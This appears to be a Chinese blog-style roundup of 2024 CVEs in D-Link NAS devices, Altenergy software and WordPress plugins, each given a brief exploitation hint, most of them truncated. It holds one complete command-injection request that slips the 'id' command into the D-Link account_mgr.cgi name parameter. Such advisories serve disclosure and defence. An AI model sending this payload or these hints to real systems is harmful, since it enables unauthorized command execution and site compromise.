#  2024年wordpress、d-link等相关的多个cve漏洞   
棉花糖糖糖  TtTeam   2024-11-25 00:50  
  
⚠️漏洞  
  
  
一、CVE-2024-10914  
  
- D-Link DNS-320、DNS-320LW、DNS-325 及 DNS-340L 中的漏洞，版本截至 20241028。  
  
- 利用方式：GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27 HTTP/1.1。  
  
二、CVE-2024-11305  
  
- Altenergy Power Control Software 关键漏洞，版本截至 20241108。  
  
- 利用方式：  
  
- POST /index.php/display/status_zigbee HTTP/1.1等一系列请求头信息。  
  
三、CVE-2024-10793  
  
- WP Security Audit Log 插件的 XSS 漏洞。  
  
- 利用方式：curl -X POST...。  
  
四、CVE-2024-11199  
  
- 插件 rescue_progressbar 的存储 XSS 攻击。  
  
- 利用方式：[rescue_progressbar...]。  
  
五、CVE-2024-11381  
  
- 插件 ch_registro 的存储 XSS 攻击。  
  
- 利用方式：[ch_registro...]。  
  
六、CVE-2024-43919  
  
- YARPP <= 5.30.10 缺少授权漏洞，可未经授权修改展示类型。  
  
- 利用方式：GET /...。  
  
七、CVE-2024-52433  
  
- My Geo Posts Free <= 1.2 的未经认证 PHP 对象注入漏洞。  
  
- 利用方式：GET / HTTP/2...。  
  
八、CVE-2024-9935  
  
- Elementor 页面构建器 PDF 生成插件 <= 1.7.5 的未经认证任意文件下载漏洞。  
  
- 利用方式：GET /...。  
  
免责声明：仅供教育目的，未经许可使用这些漏洞非法，作者不承担后果。  
  
  
